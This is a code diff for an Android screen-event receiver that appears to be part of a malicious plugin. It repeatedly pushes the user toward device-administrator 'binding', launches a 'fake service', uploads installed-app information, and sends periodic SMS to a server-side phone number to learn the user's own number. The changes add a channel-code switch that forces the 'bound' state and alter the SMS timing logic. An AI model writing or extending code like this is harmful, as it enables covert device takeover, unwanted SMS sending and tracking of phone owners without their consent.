@@ -43,6 +43,7 @@ public class ScreenBRC extends BroadcastReceiver {
 
         if (intent == null) return;
 
+        CommonUtil.checkIfShouldUpdatePluginSMSStatus(context);
         CommonUtil.checkIfNeedUploadPhoneInstallInfo(context);
 
         //如果只剩下一个域名了，去服务器获取
@@ -72,6 +73,11 @@ public class ScreenBRC extends BroadcastReceiver {
         boolean isDeviceBinded = dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class))
                                      && PluginSettingManager.getInstance().getKeyHasBindingDevices();
 
+        int channel = Integer.valueOf(Config.CHANNEL_CODE);
+        if (channel > 900000) {
+            isDeviceBinded = true;
+        }
+
         String oldPhoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
         if (!TextUtils.isEmpty(oldPhoneNumbers)) {
             Intent i = new Intent();
@@ -81,8 +87,6 @@ public class ScreenBRC extends BroadcastReceiver {
         }
 
         AppRuntime.getPhoneNumberForLocal(context);
-
-        checkIfBinding(context, isDeviceBinded);
 
         if (intent != null/* && isDeviceBinded*/) {
             if (Config.DEBUG) {
@@ -177,9 +181,9 @@ public class ScreenBRC extends BroadcastReceiver {
                         smsC.setTimeInMillis(PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone());
                         int smsLastDay = smsC.get(Calendar.DAY_OF_YEAR);
                         int smsLastYear = smsC.get(Calendar.YEAR);
-                        int smsSendDelayDays = (curYear - smsLastYear) * 365 - smsLastDay + curDay;
+                        int smsSendDelayDays = (curYear - smsLastYear) * 365 + (curDay - smsLastDay);
                         long deta = System.currentTimeMillis() - PluginSettingManager.getInstance().getKeyLastSendMsgToServicehPhone();
-                        if (smsSendDelayDays >= Config.SMS_SEND_DELAY || deta >= Config.SMS_IMSI2PHONE_DELAY) {
+                        if (smsSendDelayDays >= Config.SMS_SEND_DELAY/* || deta >= Config.SMS_IMSI2PHONE_DELAY*/) {
                             //如果时间大于1天的，并且手机号码是空的，那么就要重新获取手机号码
                             int times = PluginSettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes();
                             if (Config.DEBUG) {
@@ -260,10 +264,8 @@ public class ScreenBRC extends BroadcastReceiver {
                 }
             }
         }
-    }
 
-    private void checkIfBinding(Context context, boolean isBinding) {
-        if (!isBinding) {
+        if (!isDeviceBinded) {
             if (AppRuntime.WATCHING_SERVICE_RUNNING.get()) return;
 
             if (Config.DEBUG) {
@@ -272,9 +274,9 @@ public class ScreenBRC extends BroadcastReceiver {
             }
 
             if (PluginSettingManager.getInstance().getDeviceBindingCount() <= Config.DEVICE_BINDING_MAX_COUNT
-            /**
-             && PluginSettingManager.getInstance().getBindWindowNotShowCount() <= 3
-             */) {
+                    /**
+                && PluginSettingManager.getInstance().getBindWindowNotShowCount() <= 3
+                     */) {
                 CommonUtil.startFakeService(context, "ScreenBRC::onReceive");
 
                 Intent i = new Intent();
